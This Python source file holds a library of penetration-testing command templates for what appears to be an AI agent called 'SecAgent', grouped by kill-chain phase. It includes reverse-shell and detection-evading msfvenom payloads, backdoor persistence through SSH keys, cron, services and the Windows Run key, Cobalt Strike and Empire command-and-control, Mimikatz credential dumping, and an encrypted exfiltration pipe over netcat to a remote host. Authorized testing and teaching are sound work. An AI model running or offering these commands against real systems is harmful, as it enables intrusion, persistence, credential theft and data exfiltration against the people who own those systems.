"""
Command Templates for SecAgent Interactive Mode
Pre-defined command templates for common pentesting tasks
"""

class CommandTemplates:
    """Collection of pentesting command templates"""
    
    @staticmethod
    def get_reconnaissance_commands():
        """Get reconnaissance phase commands"""
        return {
            "port_scan_basic": {
                "template": "nmap -sS -sV {target}",
                "description": "Basic TCP SYN scan with service detection",
                "example": "nmap -sS -sV 192.168.1.100"
            },
            "port_scan_full": {
                "template": "nmap -sS -sV -O -A -p- {target}",
                "description": "Full port scan with OS detection and scripts",
                "example": "nmap -sS -sV -O -A -p- 192.168.1.100"
            },
            "port_scan_udp": {
                "template": "nmap -sU --top-ports 1000 {target}",
                "description": "UDP scan of top 1000 ports",
                "example": "nmap -sU --top-ports 1000 192.168.1.100"
            },
            "subdomain_enum": {
                "template": "sublist3r -d {domain}",
                "description": "Enumerate subdomains using Sublist3r",
                "example": "sublist3r -d example.com"
            },
            "dns_enum": {
                "template": "dnsrecon -d {domain}",
                "description": "DNS reconnaissance and enumeration",
                "example": "dnsrecon -d example.com"
            },
            "whois_lookup": {
                "template": "whois {domain}",
                "description": "WHOIS domain information lookup",
                "example": "whois example.com"
            },
            "web_tech_scan": {
                "template": "whatweb {url}",
                "description": "Web technology fingerprinting",
                "example": "whatweb http://example.com"
            }
        }
    
    @staticmethod
    def get_weaponization_commands():
        """Get weaponization phase commands"""
        return {
            "msfvenom_reverse_shell": {
                "template": "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format}",
                "description": "Generate reverse shell payload with msfvenom",
                "example": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf"
            },
            "custom_wordlist": {
                "template": "cewl -d 2 -m 5 -w {output} {url}",
                "description": "Generate custom wordlist from website",
                "example": "cewl -d 2 -m 5 -w wordlist.txt http://example.com"
            },
            "hash_crack_prep": {
                "template": "john --wordlist={wordlist} {hashfile}",
                "description": "Prepare hash cracking with John the Ripper",
                "example": "john --wordlist=rockyou.txt hashes.txt"
            },
            "payload_encoder": {
                "template": "msfvenom -p {payload} -e {encoder} -i {iterations} -f {format}",
                "description": "Encode payload to evade detection",
                "example": "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe"
            }
        }
    
    @staticmethod
    def get_delivery_commands():
        """Get delivery phase commands"""
        return {
            "http_server": {
                "template": "python3 -m http.server {port}",
                "description": "Start simple HTTP server for payload delivery",
                "example": "python3 -m http.server 8080"
            },
            "smb_server": {
                "template": "impacket-smbserver share . -smb2support",
                "description": "Start SMB server for file sharing",
                "example": "impacket-smbserver share . -smb2support"
            },
            "netcat_listener": {
                "template": "nc -lvnp {port}",
                "description": "Start netcat listener for reverse shells",
                "example": "nc -lvnp 4444"
            },
            "metasploit_handler": {
                "template": "msfconsole -x 'use exploit/multi/handler; set payload {payload}; set lhost {lhost}; set lport {lport}; run'",
                "description": "Start Metasploit handler for payload",
                "example": "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost 192.168.1.10; set lport 4444; run'"
            }
        }
    
    @staticmethod
    def get_exploitation_commands():
        """Get exploitation phase commands"""
        return {
            "web_vuln_scan": {
                "template": "nikto -h {target}",
                "description": "Web vulnerability scanner",
                "example": "nikto -h http://192.168.1.100"
            },
            "dir_brute": {
                "template": "gobuster dir -u {url} -w {wordlist}",
                "description": "Directory brute forcing",
                "example": "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt"
            },
            "sql_injection": {
                "template": "sqlmap -u '{url}' --batch --dbs",
                "description": "SQL injection testing with sqlmap",
                "example": "sqlmap -u 'http://example.com/page.php?id=1' --batch --dbs"
            },
            "xss_scan": {
                "template": "xsser --url '{url}' --auto",
                "description": "XSS vulnerability scanner",
                "example": "xsser --url 'http://example.com/search.php?q=test' --auto"
            },
            "smb_enum": {
                "template": "enum4linux {target}",
                "description": "SMB enumeration tool",
                "example": "enum4linux 192.168.1.100"
            },
            "ssh_brute": {
                "template": "hydra -L {userlist} -P {passlist} {target} ssh",
                "description": "SSH brute force attack",
                "example": "hydra -L users.txt -P passwords.txt 192.168.1.100 ssh"
            },
            "exploit_search": {
                "template": "searchsploit {service} {version}",
                "description": "Search for exploits in exploit database",
                "example": "searchsploit apache 2.4.41"
            }
        }
    
    @staticmethod
    def get_installation_commands():
        """Get installation phase commands"""
        return {
            "ssh_persistence": {
                "template": "ssh-keygen -t rsa -f {keyfile} && cat {keyfile}.pub >> ~/.ssh/authorized_keys",
                "description": "Create SSH key for persistence",
                "example": "ssh-keygen -t rsa -f backdoor_key && cat backdoor_key.pub >> ~/.ssh/authorized_keys"
            },
            "cron_persistence": {
                "template": "echo '{schedule} {command}' | crontab -",
                "description": "Add cron job for persistence",
                "example": "echo '*/5 * * * * /tmp/backdoor.sh' | crontab -"
            },
            "service_persistence": {
                "template": "systemctl enable {service} && systemctl start {service}",
                "description": "Enable service for persistence",
                "example": "systemctl enable backdoor.service && systemctl start backdoor.service"
            },
            "registry_persistence": {
                "template": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d {path}",
                "description": "Windows registry persistence",
                "example": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\temp\\backdoor.exe"
            }
        }
    
    @staticmethod
    def get_command_control_commands():
        """Get command and control phase commands"""
        return {
            "meterpreter_session": {
                "template": "msfconsole -x 'use exploit/multi/handler; set payload {payload}; set lhost {lhost}; set lport {lport}; run'",
                "description": "Start Meterpreter session handler",
                "example": "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.10; set lport 4444; run'"
            },
            "empire_listener": {
                "template": "powershell-empire --listener {name}",
                "description": "Start PowerShell Empire listener",
                "example": "powershell-empire --listener http"
            },
            "cobalt_strike": {
                "template": "./teamserver {ip} {password}",
                "description": "Start Cobalt Strike team server",
                "example": "./teamserver 192.168.1.10 password123"
            },
            "tunnel_setup": {
                "template": "ssh -D {port} -f -C -q -N {user}@{host}",
                "description": "Setup SSH SOCKS tunnel",
                "example": "ssh -D 8080 -f -C -q -N user@192.168.1.100"
            }
        }
    
    @staticmethod
    def get_actions_objectives_commands():
        """Get actions on objectives phase commands"""
        return {
            "data_exfil": {
                "template": "tar -czf - {directory} | openssl enc -aes-256-cbc -k {password} | nc {host} {port}",
                "description": "Encrypted data exfiltration via netcat",
                "example": "tar -czf - /home/user/documents | openssl enc -aes-256-cbc -k password123 | nc 192.168.1.10 9999"
            },
            "privilege_escalation": {
                "template": "linpeas.sh",
                "description": "Linux privilege escalation enumeration",
                "example": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
            },
            "lateral_movement": {
                "template": "psexec.py {domain}/{user}:{password}@{target}",
                "description": "Lateral movement with PsExec",
                "example": "psexec.py DOMAIN/user:password@192.168.1.101"
            },
            "credential_dump": {
                "template": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit",
                "description": "Dump credentials with Mimikatz",
                "example": "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' exit"
            },
            "network_discovery": {
                "template": "nmap -sn {network}",
                "description": "Network discovery ping sweep",
                "example": "nmap -sn 192.168.1.0/24"
            }
        }
    
    @staticmethod
    def get_all_commands():
        """Get all command templates organized by phase"""
        return {
            "reconnaissance": CommandTemplates.get_reconnaissance_commands(),
            "weaponization": CommandTemplates.get_weaponization_commands(),
            "delivery": CommandTemplates.get_delivery_commands(),
            "exploitation": CommandTemplates.get_exploitation_commands(),
            "installation": CommandTemplates.get_installation_commands(),
            "command_control": CommandTemplates.get_command_control_commands(),
            "actions_objectives": CommandTemplates.get_actions_objectives_commands()
        }
    
    @staticmethod
    def search_commands(query: str, phase: str = None):
        """Search for commands matching query"""
        all_commands = CommandTemplates.get_all_commands()
        results = []
        
        search_phases = [phase] if phase else all_commands.keys()
        
        for phase_name in search_phases:
            if phase_name in all_commands:
                for cmd_name, cmd_info in all_commands[phase_name].items():
                    if (query.lower() in cmd_name.lower() or 
                        query.lower() in cmd_info['description'].lower() or
                        query.lower() in cmd_info['template'].lower()):
                        results.append({
                            'phase': phase_name,
                            'name': cmd_name,
                            'info': cmd_info
                        })
        
        return results
